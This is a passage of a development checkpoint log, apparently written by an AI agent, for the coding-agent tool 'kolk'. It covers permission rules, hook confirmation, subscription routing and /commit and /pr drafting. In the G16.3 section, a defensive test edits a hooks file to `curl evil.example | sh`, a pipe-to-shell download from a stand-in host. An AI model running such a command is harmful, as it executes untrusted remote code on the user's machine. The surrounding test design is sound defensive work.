hand-edits `devices.json`. `docs/plan/26-remote-access.md` already specifies the surface.

- [x] **I26.8a `kolk devices` lists what is paired** — id, label, tier, when it was paired and last
      seen. Empty is a sentence, not a blank: a list that prints nothing cannot be told from a
      command that failed. The parity ratchet redrew this leaf: a top-level verb must have a slash
      twin, so `/devices` shipped with it rather than a tick later.
- [x] **I26.8b `kolk devices revoke <id>`** — removes one and says so. An id that is not there is a
      refusal naming what is, because a typo'd revoke that reports success is worse than an error.
- [x] **I26.8c `/devices` and `/devices revoke <id>`** — the listing half shipped inside I26.8a and
      the revoke half inside I26.8b, both forced there by the parity ratchet rather than planned.

**B12.15 the subscription path's failure tests.** Phase A's happy path is green and its failure
modes are unproven. A33.7 sharpened this: allowance detection over a vendor CLI is matched on
wording, and it is these tests that widen the list from something real rather than something guessed.

- [x] **B12.15a a plan login that expired mid-session** — the turn fails with a sentence naming the
      plan and how to sign in again, and the session survives to be retried.
- [x] **B12.15b the vendor CLI removed underneath a live session** — the backend it was resolved to
      is gone. Not a panic, not a silent fall back to a billed model: the run stops and says which
      binary went missing.
- [x] **B12.15c a connector disabled or unverified after selection** — routing chose it at startup
      (A33.6) and it stopped qualifying. The session says so once rather than each turn.

**B12.13 first run without an OpenRouter key — the owner's decision, recorded 2026-08-28.**
Rejected: dropping the key requirement outright. The order is *free first, subscription when there
is one, free again when there is not*, and the switch is configurable rather than assumed.

- [x] **B12.13a first run stands up on free models alone** — an OpenRouter key with no credit is
      enough to start. Nothing may demand a paid model to reach a first answer.
- [x] **B12.13b a subscription becomes the default only once it is available** — enabled and
      verified, per A33.6, and not before. Availability is a fact about this machine, so it is
      re-checked rather than remembered from install.
- [x] **B12.13c falling back the other way** — no subscription available means free models again,
      not a metered one.
- [x] **B12.13d `routing.on_free_exhausted`** — `free` (default), `paid`, `stop`. The same shape as
      `routing.on_subscription_limit` (A33.7) and for the same reason: nothing starts spending
      because a limit was reached. Consolidate with it rather than growing a second vocabulary.

**L13.5b4 propose a runtime pin.** The owner cleared me to *propose*, not to invent: fetch a specific
upstream release, compute its SHA-256 from the bytes, and put version, URL and digest up for a yes or
no. `pinnedRuntime` stays empty until that answer.

- [!] **L13.5b4a a candidate release** — **refused, with evidence.** No pin can be proposed: the
      install path cannot accept any shape Ollama actually ships. Three blockers below, each checked
      against the live release data rather than assumed.

**T0.5 clean-machine rehearsal.** The owner will uninstall and reinstall to run it. My half is making
that rehearsal a script rather than a memory, so what was proven is legible afterwards.

- [x] **T0.5a a written rehearsal the owner can run** — `scripts/rehearse-clean-machine.sh`.
      Refuses on a machine that is not clean and never deletes anything;
      `KOLK_REHEARSAL_DRY_RUN=1` checks the preconditions without installing.

### Refused, with the reason, so nobody re-opens them by accident

- **Phase E's OS sandbox matrix — still deferred, and the reason survived a challenge.** The owner
  asked whether a kernel refusal would surface as an OS prompt, "like on macOS when an agent needs
  the local network". It would not. That prompt is TCC, a *privacy consent* system built to ask a
  human. Landlock returns `EACCES` and seatbelt simply denies — neither prompts, and neither can be
  asked. So the OS cannot explain a refusal on kolk's behalf: kolk would have to produce that
  explanation itself, per platform, or leave the user staring at a bare permission error with no idea
  which guard fired. That is the work, and it still needs a CI answer before it needs code.
- **I26.7's client page — parked deliberately, checkpoint kept.** Not merely unbuilt: the route
  answers `501` because `kolk serve` owns no agent, and items 27 and 29 both refused the supervisor
  that would change that. A page shipped against a 501 would be a demo, not a feature.

### Item 33 queued — agentic mode, one leaf per tick

The build order below is not the order the asks were given. It is cheapest-first among things that
stand alone, so every tick ends with something a person can see, and the two that change *what a run
costs* come before the two that change *which models it opens* — a wrong model choice is easy to
watch once the count and the costs are visible, and hard to debug before.

Each leaf: red first, focused verify, full `make check`, record here, commit. Push when the set is
done.

- [x] **A33.1 publish subagent lifecycle events** — the orchestrator emits `subagent.started` and
      `subagent.finished` with task index, kind and model. The protocol already defines both and the
      conformance test already covers them, so this is a publisher, not a contract change. Verify by
      driving an orchestrated run against the mock and reading the events off the bus.
- [x] **A33.2 the live agent count** — the TUI shows how many subagents are running, above the
      composer, beside the existing status. Started minus finished, the kinds in flight, nothing
      else. Must not become a progress bar (item 29's test: name the decision it changes). Verify
      the count returns to zero when a run ends, including when a task fails.
- [x] **A33.3 free fast lane** — delete the clause that refuses a free model when the main model is
      paid. A free tool-capable model wins fast-lane and boilerplate work whenever one exists;
      `slot.fast` still overrides. Test the exact case that is wrong today: paid main model, free
      model available, mechanical task → free model chosen.
- [x] **A33.4 per-slot model selection** — an empty slot resolves from the live catalogue by what
      the slot is for (strongest / tool-capable / cheap-and-high-context / free) instead of
      collapsing to the effort model. Printed with the plan before anything runs, as the orchestrator
      already prints its routing. Measure the selection: it runs once per plan, not per task.
- [x] **A33.5 ratings inform the choice** — this machine's own 1–5 ratings from `stats.jsonl` weight
      the selection, so a model somebody rated badly stops being chosen for them. The one ranking
      signal no vendor benchmark has. Reuse `CostForSessions`' cheap-read lesson: one pass, not one
      per slot.
- [x] **A33.6 subscriptions first** — a verified subscription connector outranks a metered model for
      any slot it can fill. Refuse to invent capability: a connector that is `listed` rather than
      `enabled` is not a candidate, which is the distinction v1.2.3 just made honest.
- [x] **A33.7 the limit decision** — `routing.on_subscription_limit` with `ask` (default), `switch`,
      `stop`. Wired to the existing retry path, reported in the transcript, and never a default that
      spends money without being asked. `ask` with nobody to ask is a stop, not a yes, and the stop
      names the setting that changes it. Settled once per session, because subagents share one
      `Agent` and eight of them would otherwise raise eight questions for one terminal.
- [x] **A33.8 a snapshot per writing subagent** — item 32's store, taken before a writing task and
      rewindable alone, so one bad task does not cost the whole turn. Only writing kinds: research
      and explain change nothing.

Two questions the doc leaves open, to be answered when the code makes them concrete rather than
guessed at now: whether the orchestrator may re-slot a failing model mid-run, and how many subagents
on one free model is too many before a free tier's rate limit turns width into waiting.

### G16.3 built — project hooks are shown first, and the last named leaf closes

*A `.kolk/hooks.json` in a cloned repository is a shell command a stranger wrote.* The leaf is one
sentence of policy and three decisions that only appear when you build it.

**"Shown" means all of them, together, before any of them runs.** Listing each command as its event
fired would let a repository hide the fifth behind four boring ones, and the person approving would
be answering a different question each time without knowing how many were left. The prompt also says
whose commands these are — *"shell commands from this repository, not from you"* — because the
distinction is the entire reason for asking.

**Approval is keyed by the file's contents, not its path.** This is the decision worth the leaf. A
remembered "yes" attached to a directory would let a repository approve something harmless and edit
it afterwards: the approval outlives the thing it was given for, which is a supply-chain move with
a friendly face. A SHA-256 of the file means an edit re-asks — tested by approving one file, editing
it to `curl evil.example | sh`, and asserting the second is refused and asked about separately.

**Session-scoped, and persistence refused in writing rather than deferred vaguely.** A remembered yes
that survives restarts is a thing a repository can farm. Persisting one safely would need a store the
project cannot influence and an expiry nobody has yet wanted. If being asked once per session becomes
the friction that stops people reading the list, *that* is the moment to add it — and the list being
read is the whole point.

**Defaults are no, everywhere.** An empty answer, an unreadable prompt, and no one at the terminal
all mean no; declining says plainly that the user's own hooks still work, so refusing costs nothing
someone already had.

**Where this differs from G16.1, and why.** Markdown commands are a *lookup*: the nearer file wins a
name and the other is never seen. Hooks are *actions*, so both run and the user's go first — there is
no reason a project's formatter should silence a notification someone configured for themselves.
Nearer does not mean instead-of when nothing is being named. The shape was reused where it fit and
deliberately not where it did not.

With this, **every named build leaf in PLAN.md is done.**

### Every named build leaf is closed — what genuinely remains

Audited against `CHECKPOINTS.md` and `PLAN.md` rather than assumed:

- **T0.5 clean-machine rehearsal** — install, first run, key, first model response on a machine with
  no Go toolchain and no prior Kolkrabbi files. It cannot honestly be closed from the machine that
  built all this; it is owner work on a clean one.
- **B12.13** (a subscription-only OpenRouter key) and **L13.5b4** (pinning a managed runtime release
  with its checksum) — both parked on the owner since before this session, both unchanged.
- **Phase A's failure-path tests** — recorded as open in the phase table, never picked up.
- **Phase E's OS sandbox matrix** — deferred deliberately, still deferred.
- **Item 16's own open questions** — mode/effort in a command's front matter (left out of v1), and
  MCP transports, which stay deferred behind the two blockers the item names. G16.4 closed the
  permission half of the first blocker; the schema half is measured (G16.5) and the bridge is not
  built.

Nothing else in the plan is waiting on work I can do without a decision from the owner.

Acceptance checklist:

- [x] eleven tests written first across two packages, including the edited-file case.
- [x] approval keyed by content, so it cannot be inherited by a different file.
- [x] persistence refused with its reasoning, not deferred without one.
- [x] every default proven to be no, including nobody at the prompt.
- [x] the difference from G16.1's precedence explained rather than copied blindly.
- [x] full `make check` green: 2,298 tests, 0 lint issues.

### G16.2 built — hook events, and the confirmation that is the point

Item 15 sent formatter-after-edit to this leaf rather than building it there, and the reason is the
whole design: *a formatter that runs silently after every edit is a shell command executing with
nobody at the prompt.* So the confirmation is not a wrapper around the feature; it is the feature.

**Three post-events, and no `pre-tool`.** `post-edit`, `post-write`, `session-end` — each names
something that has *already happened*, so a hook can react and cannot arbitrate. A hook that could
veto a tool call would be a second permission system, and E13 exists so there is exactly one. A test
asserts the vocabulary is three and that none of them begins with `pre-`, which is the shape of the
mistake rather than the name of it.

**Confirmed once per distinct command per session**, keyed by the command text — not per event and
not per file, so a formatter approved for one edit is not re-asked on the next hundred. **A decline
is remembered too**, and that is the half worth naming: being asked again on every edit is how a
person ends up saying yes to make it stop.

**The floor refuses without asking.** A hook is judged by `hardline` like any other command, and a
refusal is never offered as a question — asking would imply the floor is a thing a prompt can lift.
Tested by driving a runner whose allow-check refuses and asserting the user was never consulted.

**A broken hook cannot cost anyone their work.** `Run` returns results and never an error: a
formatter that is not installed, a shell that cannot start, a command that exits 127 — each is
reported and the edit that already happened stands. That is what makes *post* events the safe ones.
Bounded by the effort dial like `bash`, so a hook that hangs cannot hang the session, and its output
is scrubbed like any tool result because a hook prints whatever it prints.

**Two environment variables and nothing else.** `$KOLK_FILE` and `$KOLK_SESSION`, asserted by a test
that counts them — not the user's whole environment, and never a credential. A hook is somebody's
one-line script, and the blast radius of handing it everything is the blast radius of that script
being wrong.

**Deliberately the user's file only.** `~/.config/kolk/hooks.json` is wired; a project's is not.
A `.kolk/hooks.json` in a cloned repository is a shell command a stranger wrote, and showing and
confirming it before the first one runs is G16.3's decision, not something to slip in here. A
malformed hooks file costs its hooks and not the session, so somebody mid-edit on their own config
can still work.

The seam is `tools.Options.PostWrite`, mirroring `PreWrite` exactly: one seam in, one seam out, and
the outbound one returns nothing — which is the type system saying a hook cannot veto.

Acceptance checklist:

- [x] eleven tests written first, covering each row of the item's rule table.
- [x] the decline remembered as well as the approval, so nobody is nagged into yes.
- [x] the floor proven to refuse without consulting the user.
- [x] every failure path proven non-fatal, including a shell that cannot run at all.
- [x] the environment asserted to be exactly two variables.
- [x] project hooks left to G16.3 rather than folded in.
- [x] full `make check` green: 2,286 tests, 0 lint issues.

### G16.1 built — markdown commands

A file is a command: `.kolk/commands/review.md` is `/review`, its body is the prompt, and the prompt
is sent as a **user turn** rather than a system prompt — because a command is a thing the user said.
It carries no permissions of its own; what the model then does is judged exactly as if the person had
typed it, which is what stops a command being a way around the tier.

**Three edge cases decided rather than discovered.**

*A name that collides with a built-in is refused, not renamed.* A file that could shadow `/undo`
would make the one command a person reaches for when something has gone wrong mean whatever a
repository says it means — the same instinct G16.3 will apply to hooks, arriving early because a
markdown command is the cheapest way to try it. Silently loading it under another name would be
worse: someone would be typing a command that is not the one they wrote.

*Both a project and a user file with one name:* the project wins, "because it is nearer the work",
and the implementation makes that structural — the first directory to define a name keeps it, so
precedence is the order of the list rather than a comparison someone has to maintain.

*An enormous file* is cut at a line boundary at 16 KiB, matching the project-memory cap it sits
beside. Half a sentence of instruction is worse than none, and a prompt that does not fit costs the
window before the work starts.

**`$ARGUMENTS` is placed or appended.** Replaced wherever it appears, so a command may name its
argument twice; and when the body never mentions it the arguments are appended instead, so a command
still composes with whatever was typed after it rather than silently dropping it.

**Claude Code's directory is read, not converted.** `.claude/commands` is the last fallback, behind
both kolk directories. Someone who already wrote those should not have to move them to try this, and
the formats are close enough that divergence would be ours to explain.

**Measured, because the lookup touches the filesystem:** 16 µs when no command directories exist —
the overwhelmingly common case, and the one that matters — and 513 µs with forty commands. It is paid
on `/help` and on an unknown slash command, not per keystroke. Nothing is cached on purpose: a file
added mid-session should work, and a cache would mean it did not until the session restarted.

**Not built, deliberately:** front matter honours `description` and nothing else. Whether a command
may declare a mode or an effort is item 16's open question, left out of v1 because it turns a command
from "expands to a prompt" into a thing that reconfigures the session, which is a larger promise.

Acceptance checklist:

- [x] eight tests written first, one per rule in the item's table plus the three edge cases.
- [x] the built-in collision refused, with the reasoning recorded next to the list.
- [x] precedence made structural rather than a comparison to maintain.
- [x] the size cap matched to the existing project-memory behaviour instead of reinvented.
- [x] the lookup measured, and the no-directories case measured separately.
- [x] the mode/effort question left alone, as the doc decided.
- [x] full `make check` green: 2,275 tests, 0 lint issues.

### G16.4 built — `mcp(...)` rules, and a hole the widest rule already had

Item 16 calls this the blocker: without it, "ask every time" is the only honest posture, "which makes
a twelve-tool server unusable". Building it made the problem concrete rather than theoretical — an
MCP tool has **no path and no command**, so `Rule.targets` had nothing to try a pattern against and
every server tool matched no rule at all.

**`mcp` is a family, not a pattern inside an existing one**, and the reason is that the other families
are *lists of built-in tool names*, which works because those are a closed set. A server's tools are
not, so `mcp`'s membership has to be a **test**, and the test is the namespace separator. That is
what item 16's `<server>__<tool>` choice buys: `allow mcp(github__*)` means one server and nothing
else, and a name clash cannot make it mean another.

**Two directions of leakage are closed, each with its own test.** An `mcp` rule never covers a
built-in — `allow mcp(*)` matching `bash` would be a permission rule wearing somebody else's name.
And a built-in rule never covers a server tool: `allow bash(*)` governing `github__delete_repo` would
grant something the user never saw. A tool name without the separator is not a server tool, which is
what makes "one server's tools" a decidable set at all.

**A hole that already existed turned up on the way.** `any` and `*` are documented as *every* tool,
and they did not cover MCP tools — the same missing-target bug, hidden because nothing produced such
a tool yet. A user who wrote the widest rule the system has would have found one class of call quietly
excluded from it. Fixed with the family, and pinned by its own test.

**The floor is unreachable from here**, tested with `allow mcp(*)` plus `allow bash(*)` in full-auto
against a piped-curl command: still denied. `hardline` runs before rules, and this changes nothing
about that.

Useful without MCP existing, exactly as the item promised: the rules parse, match and are tested today
against synthetic namespaced names, so the transport work lands into a permission model that is
already right.

Acceptance checklist:

- [x] seven tests written first, two of them for leakage in each direction.
- [x] `mcp` made a family with a membership test, because a server's tools are not a closed set.
- [x] the pre-existing `any`/`*` hole found and closed rather than worked around.
- [x] the floor proven unreachable from an mcp rule.
- [x] the family vocabulary comment updated so the type still lists what it accepts.
- [x] full `make check` green: 2,266 tests, 0 lint issues.

### G16.5 built — tool schemas stop being free, and the estimate was wrong

Item 16 named this leaf as the thing to do **before** designing a mechanism that multiplies schemas:
*measure what schemas cost a request.* The measurement is the leaf, and it changed the answer.

**The doc said "about 5 KB". They are 2,816 bytes** for five tools — wrong by nearly a factor of two,
in the direction that would have justified more mechanism than the problem needs. The search-and-load
bridge for MCP tools is still the right shape, but it is less urgent than a guessed number made it
look, and the doc now carries the measured figure with a note saying when it stopped being an
estimate. This is the third time this loop that a written claim failed against the code, and the
second where the wrong number would have justified building more than was needed.

**The budget is a failing test, not a note.** Tool schemas are the one cost in this codebase paid per
turn, per request, forever — a single MCP server can add a dozen at once, and the research records
exactly that failure in Hermes and Goose, where schemas devour the window before the work starts. So
there is a total budget (4 KB, against 2,816 today) and a **per-tool** budget (1,536 bytes, against
769 for the largest), because one verbose description is how the total grows without anyone
deciding to grow it. Both were mutation-tested by lowering them until they failed.

**Reported, not just enforced.** `SchemaCost` returns the total and the per-tool breakdown, and
`kolk doctor` prints "5 tools, 2 KB of schema on every request" — so anything that adds tools can say
what it costs before it is switched on, which is what the leaf was for.

Acceptance checklist:

- [x] the number measured before anything was built on it.
- [x] the doc's estimate corrected in place, with the date it stopped being a guess.
- [x] a per-tool budget as well as a total, because one description can grow the total quietly.
- [x] both budgets mutation-tested by lowering them until they bit.
- [x] surfaced in `kolk doctor`, so it is not an export with no caller.
- [x] full `make check` green: 2,259 tests, 0 lint issues.

### What is actually left, audited rather than assumed

The phase table above is rewritten to match the tree as of this checkpoint. Phases C, D, E, F, I and
J are complete. What remains, honestly:

- **G16.1–G16.4** — markdown commands, hook events and their confirmation, project hooks shown before
  they run, and `mcp(...)` permission rules. All four are real build work, and item 16's doc has the
  decisions already made. G16.4 is the one worth doing first: it is described as the blocker for MCP
  and is useful without it.
- **T0.5 clean-machine rehearsal** — install, first run, key addition and a first model response from
  a machine with no Go toolchain and no prior Kolkrabbi files. This cannot be honestly closed from
  inside the machine that has been building it; it needs a clean one, and it is owner work.
- **B12.13** (a subscription-only OpenRouter key) and **L13.5b4** (pinning a managed runtime release
  with its checksum) — both parked on the owner, both unchanged.
- **Phase A's failure-path tests** and **phase E's OS sandbox matrix** — recorded as open and
  deferred respectively, neither picked up since.

### I27.6 built — the view, and a correction to what I27.4 predicted

The four sources were already in place, so this leaf was rendering rather than gathering: session
headers (I27.2), the advisory lock (I27.1), the journal tail (I27.3), the usage log (I27.4) and the
shared-checkout rule (I27.5), assembled in the CLI and handed to `internal/dash` as a view model. The
gathering deliberately stayed out of the page: each source was built with its own cost decision, and
re-reading them from inside a template would have undone all four.

**Blocked sessions sort to the front, and that ordering is the feature.** Item 27's words: a session
waiting on a permission prompt has stopped, is spending nothing, and needs a person — and it looks
exactly like a session thinking hard. A view that cannot tell those apart lets work sit unnoticed for
an hour, and a view that can but puts it on row nine is the same view. The card is outlined and
tinted too, so it is visible without being read.

**One vocabulary, not two.** The page says *live*, *idle* and *blocked* because that is what
`kolk sessions` says, and a test asserts it. Cost follows I27.4's rule on both surfaces: recorded
prints, absent prints nothing, `$0.00` reserved for a session that really did run free.

**Every value is escaped**, because a session title is whatever the fast lane named it after reading
a user's words and a working directory is whatever the filesystem holds. An existing test parses the
whole page as XML, so malformed markup fails the build rather than the browser.

**I27.4's prediction was wrong, and correcting it was the most useful thing here.** That leaf refused
context-per-card and wrote the condition that would change the answer: the dash page would have the
model windows "because it renders from a process that has the catalogue in memory". It does not.
`kolk dash` reads the usage log and serves; nothing in it fetches or caches a catalogue. Context
stays refused on **both** surfaces, and the doc now states the honest condition — somewhere that
already knows each model's window without a network call. A prediction about a process nobody had
opened was the wrong kind of condition to write down: it would have quietly justified building the
wrong thing next time.

Rendering 500 cards costs 1.3 ms and 93 KB of HTML, which is the whole page.

**One process note, recorded because it nearly cost the record.** The script that was to apply this
doc correction and this entry asserted on text it had mis-transcribed, failed, and the commit went
ahead with the code alone. Caught immediately by reading the commit's file list — the entry that
would have been lost is this one — and repaired in a follow-up. An assertion that fails is doing its
job; a commit that proceeds anyway is the part to watch.

Acceptance checklist:

- [x] seven tests written first, including the ordering that makes blocked unmissable.
- [x] gathering kept in the CLI so four measured cost decisions survive.
- [x] the listing's vocabulary asserted, not assumed.
- [x] every user-controlled value escaped, with the page still parsing as XML.
- [x] I27.4's condition checked against the code and corrected where it was false.
- [x] the half-committed record noticed and repaired rather than left.
- [x] full `make check` green: 2,256 tests, 0 lint issues.

### I29.1 built — listening-port discovery, which is all item 29 kept

Item 29 refused most of its own scope — supervision, because restart, logs and health all need to
outlive Kolkrabbi and that means the daemon items 27 and 29 both declined; resource telemetry,
because nobody could name a decision CPU and memory would change. **One leaf survived, and it is
small.** Saying so is more useful than inflating it: a task starts a dev server, and the port it chose
is the one fact the user needs and the one thing the terminal does not tell them.

**It reads, and never asks.** `/proc/net/tcp` and `tcp6`, parsed as text, with `lsof` as the fallback
where `/proc` is not a thing. An HTTP request to find out what a port is would be the agent making a
network call nobody asked for, which is a worse thing than the question it answers.

**Only loopback ports get a URL**, and the parser is deliberately literal about which those are. The
kernel writes addresses little-endian per four bytes, so `127.0.0.1` appears as `0100007F`; rather
than reassemble a dotted quad and risk being clever, the two well-known loopback encodings are matched
directly. A wrong guess would print a clickable link to somebody else's network — the same reasoning
I26.5 applied to kolk's own address, applied here to somebody else's server.

**The process is not reported, on purpose.** What a person needs is the address they can open. A pid
is something the shell will tell them, and reporting it would be the first step toward the
supervision this item refused.

**Measured, because it runs on every bash call:** 1.3 ms per snapshot, two snapshots per call, so
2.7 ms — against a call that runs a command. The spec predicted "two reads of a small file"; the
measurement agrees. A test also opens a real listener and asserts it is discovered with its link,
which is the only way to know the hex parsing is right.

**The open question is half-answered.** It asked whether the port line belongs in the transcript or
the status line, and noted the first mention is needed either way. The first mention is built. The
status-line half — a server started ten turns ago, still running — needs something to hold that state
across turns, and the doc now says that is the careful part rather than leaving the question looking
untouched.

Acceptance checklist:

- [x] six tests written first, including the established-connection row that must not count as a listener.
- [x] loopback matched literally, so a link can never point at another network.
- [x] the cost measured against the spec's own prediction.
- [x] verified against a real listener, not only against fixtures.
- [x] wired into the bash tool, so it is a feature rather than an export with no caller.
- [x] the open question moved forward honestly instead of being marked done.
- [x] full `make check` green: 2,250 tests, 0 lint issues.

### I28.3 built — `/pr` hands over, and item 28 is complete

Built to I28.2's shape: read git, scrub before a model sees it, bound the input visibly, draft
through the fast lane, print the draft **and the command that would use it**, run nothing. Drafting
is where the model helps; running it is a confirmation like any other.

**Three failure paths, three explanations, no errors.** No `gh` on the machine — pull requests go
through it by design, so the message names `cli.github.com` rather than reporting a fault. A branch
never pushed — one `git push -u origin <branch>` fixes it, and the message says exactly that with the
branch filled in. No commits the base does not have — nothing to propose yet, naming the base it
compared against so the answer is checkable.

**The base is asked for, not guessed.** `git symbolic-ref refs/remotes/origin/HEAD` says what the
remote considers default, with `main` as the fallback. Guessing `master` on a repository that uses
`main` produces a diff of the entire history, which is a confusing way to fail.

**The handover is shell-quoted, and there is a test with an apostrophe in it.** A drafted title is
model-written text going onto a command line — a `don't` in it would break the command the user is
being handed, which is the worst possible place for that to happen.

**Then three copies of one boundary became one.** Writing this file produced a third `shellQuote`: the
saga had one for chapter titles, the shadow store had one for snapshot messages, and `/pr` needed one
for a drafted title. All three are the same boundary — where a quote in someone else's text stops
being punctuation and becomes syntax — and three copies is three chances for one to be subtly
different. They are now `shell.Quote`. The allowlist records that this exact function was **deleted
once for having no callers**, which was right then; three is the number that earns it back, and the
comment says so.

With this, **item 28 is complete**: dirty-tree awareness, `/commit`, `/pr` — the three things that
were worth building, around a great many that were refused.

Acceptance checklist:

- [x] seven tests written first, five of them about the paths where nothing gets drafted.
- [x] every failure path names the next command instead of reporting an error.
- [x] the base branch read from the remote rather than assumed.
- [x] the handover quoted, with an apostrophe test proving it.
- [x] the log scrubbed before drafting, prefix search asserted absent.
- [x] the third copy of shell quoting consolidated rather than added.
- [x] full `make check` green: 2,244 tests, 0 lint issues.

### I28.2 built — `/commit` drafts and stops

The item's central refusal, built as a feature: **it does not commit.** A `/commit` that commits
without a confirmation is a shell command wearing a costume, and `git commit` is already one
keystroke away with the message this prints. The output says so in as many words — the draft, then
"nothing was committed", then the exact `git commit -F -` heredoc that would use it.

**It does not stage either, and that question is now closed.** The doc leaned against offering to
stage; I28.2 answers it outright: `git add -p` is a conversation, and quietly staging everything
would surprise exactly the person who typed `/commit` — someone who was staging deliberately. With
nothing staged it says so and names `git add -p` and `git add <path>`, which is help without taking
the decision. The doc's open question is struck through with that reasoning.

**Two edge cases were decided rather than discovered later.** Nothing staged is the common mistake,
not an error, so it is answered with the command that fixes it and never the word "error". An
enormous diff is truncated **visibly**: a model handed half a change with no notice describes it as
if it were the whole one, and the person reading the message would never know — so the truncation is
in the text the model sees.

**The diff is scrubbed before it reaches a model, and that is the most important line in the file.**
A diff is the single most likely thing to carry a secret into a prompt: it is the literal text of what
changed, including the line that added a key. The test asserts not only that a key is absent but that
no twenty-character prefix survives, the same bar `kolk doctor` and `--debug` set.

**The parity ratchet asked the right question.** `/commit` has no `kolk commit` twin, and the rule
does not simply allow that — it demands a recorded reason: *"add the twin, or add it to sessionOnly
saying what it acts on that a one-shot process lacks."* The reason is real — drafting runs through the
running session's fast lane, which a one-shot process has no model wired for — and it is now written
next to twelve others rather than left as an assumption in my head.

Acceptance checklist:

- [x] six tests written first, four of them about restraint rather than function.
- [x] the diff scrubbed before drafting, with a prefix search asserted absent.
- [x] both edge cases decided in writing: nothing staged, and a diff too large to send.
- [x] the truncation made visible to the model, not just to the code.
- [x] the doc's staging question answered and struck through.
- [x] the session-only reason recorded where the ratchet asked for it.
- [x] full `make check` green: 2,237 tests, 0 lint issues.

### I28.1 built — dirty-tree awareness, and an open question answered by a cost

Item 28 calls this the highest-value thing in the item: *a session that cannot see uncommitted
changes gives advice about a tree that no longer exists.*

**The item's open question was answered by a comment written for another reason.** It asked whether
this belongs in the system prompt or beside the turn. `SetExtraSystem` already records that mutating
the system prompt mid-session **costs the provider's prompt cache**, which is why loop wakeups are
injected as user turns instead. Dirty state changes every turn, which makes it the worst possible
thing to put in the one place that must stay stable. So it goes beside the turn — decided by a cost
already measured, not by taste, and the doc's question is struck through with that reasoning.

**Names, not a diff**, as the item specified: a diff is expensive in context and the model can read
one when it needs to. What a session needs before it advises is *that* these files differ from the
last commit. The list is capped at twenty with an "…and N more", because a tree with three hundred
changed files must not put three hundred paths in front of every turn — the useful fact is that the
tree is dirty and roughly where, and an inventory is what a tool call is for.

**Measured, because it runs every turn.** `git status --porcelain` on this repository — 215 MiB of
pack, 544 files — costs **6.7 ms**. Against a turn that takes seconds that is nothing, but "per turn"
is exactly the shape that earned a measurement in each of the last three leaves.

**It reuses the saga's question rather than inventing a second one**, and the comment says plainly
what it is *not*: this reads the **user's own** repository, which is a different thing from the
shadow store's `GIT_DIR` — that one records snapshots, this one reports what a person has not
committed. Two git-shaped things in one codebase is exactly where a later reader gets confused.

**Everything about it fails quietly.** Not a repository, no git, a command that errors: all mean
"nothing to say", never a failed turn. A courtesy that can break a turn is a defect.

Acceptance checklist:

- [x] seven tests written first, across the engine's rendering and the host's look.
- [x] the open question answered from evidence already in the codebase, and struck through in the doc.
- [x] the per-turn cost measured on a real repository before shipping.
- [x] the existing `git status --porcelain` reused, with the shadow store's distinct role spelled out.
- [x] the port optional, so a non-repository or a machine without git runs turns exactly as before.
- [x] full `make check` green: 2,232 tests, 0 lint issues.

### I27.4 built — cost per card, and context refused for a reason

The leaf was specified as two fields. One shipped and one is now a written refusal, which is the more
useful half of the work.

**Cost ships, because cost is a number people act on.** A session that has quietly spent four dollars
is one somebody stops or looks into. Item 23 keeps cost measured and never a gate, and this is the
measured half. "Nothing recorded" and "ran free" stay different facts: a session with no calls prints
nothing, and a free session that did run prints `$0.00` on purpose, because collapsing them would
report a working free session as unknown.

**Context is refused.** The field was "the most recent `usage.reported` event", and building it
showed what that event actually carries: a raw prompt token count. On its own that is meaningless —
45,000 tokens is nearly full for one model and a quarter of another — so the useful form is a
percentage of the window, which needs the model's context length from the catalogue, which the
listing does not have. The raw count is exactly what item 29 refused when it dropped resource
telemetry: *a number nobody can act on teaches its reader to skip the panel.* The doc now records the
refusal and what would change it — the dash page renders from a process that already holds the
catalogue.

**Measured again, and it mattered again.** `stats.jsonl` holds every session's calls in one file, so
the first implementation decoded all of it: **218 ms over 50,000 rows / 4.4 MB.** A listing shows a
handful of sessions out of hundreds, so `CostForSessions` rejects a row on two substring scans before
any JSON is parsed — the row must be a call, and its session must be one being shown. **20 ms, 11×
cheaper**, and a differential test proves the two paths agree on the same log.

**Then the dead-export rule made the right call about the leftover.** Once the cheap path took over,
`CostBySession` had only test callers. The rule offers wire-it, delete-it or allowlist-it, and the
honest answer was none of those: it is not API, it is the plain implementation the fast one is
checked against, so it became `costBySession`. A reference implementation kept as an oracle is worth
having; an exported one nobody calls is what item 19 deleted a whole allowance for.

Acceptance checklist:

- [x] six tests written first across two packages, including the zero-versus-absent distinction.
- [x] both paths measured on the same fixture, and the fast one proved equal to the slow one.
- [x] the context half refused in writing, with the condition that would change it.
- [x] the leftover unexported rather than allowlisted, because it is an oracle and not an API.
- [x] full `make check` green: 2,225 tests, 0 lint issues.

### I27.3 built — blocked cards, and a cost that had to be measured twice

"Blocked" is the decisive field on a card: a session waiting on a permission prompt is not slow, it
has **stopped**, and it stays stopped until a person answers. The rule is the doc's — the last
`permission.requested` with no matching `permission.resolved` — and requests are correlated **by id**
rather than by position, because answering one prompt does not unblock a later one. That has its own
test, with a resolution arriving for the first request while the second is still open.

**The measurement was the leaf.** Item 27 was explicit that I27.2 made this listing cheap on purpose,
so the tail read was measured rather than assumed, over 559 journals of 440 KB — the shape of a
working machine:

| Version | Per journal | 559 journals |
| --- | --- | --- |
| First working version | 2.60 ms | **1.45 s** |
| Reject non-permission lines before decoding | 328 µs | 184 ms |
| Reject the whole tail before splitting it | **150 µs** | **84 ms** |

The first number would have shipped a listing nobody polls, which is exactly the failure item 27
names: *a listing that is expensive is a listing that gets called less often than it should.* The fix
was not a smaller window but a cheaper rejection — a permission event is a rare line in a journal
full of message deltas, so a substring scan discards the rest for almost nothing, and one scan of the
whole tail answers the common case (no permission event at all) without splitting it into lines. 17×,
with the 64 KiB window unchanged.

**Robustness came from what the format actually is.** A journal is appended to by a live process, so
the first line of a tail read is usually a fragment and the last can be half-written. A line that
does not decode costs itself and nothing else — tested with a deliberately truncated final line that
must not hide an open request above it.

Surfaced in `kolk sessions` beside I27.5's warning, naming the tool, the first line of the detail, and
the command that resumes the session to answer. Only live sessions are read, because an idle session
cannot be blocked and there is nothing to look for.

Acceptance checklist:

- [x] six tests written first, including id-correlation and the half-written line.
- [x] the cost measured on a realistic fixture, not estimated.
- [x] the first measurement rejected the implementation, and the second and third proved the fix.
- [x] the window kept at 64 KiB — the saving came from cheaper rejection, not a smaller read.
- [x] surfaced in the listing, so it is a feature rather than another uncalled export.
- [x] full `make check` green: 2,217 tests, 0 lint issues.

### I27.5 built — a shared checkout says so, and an allowlist entry came due

The smallest queued I27 leaf, chosen deliberately over starting several. Item 27 does not refuse two
terminals in one repository — people do that on purpose. What it refuses is **silence** about it, and
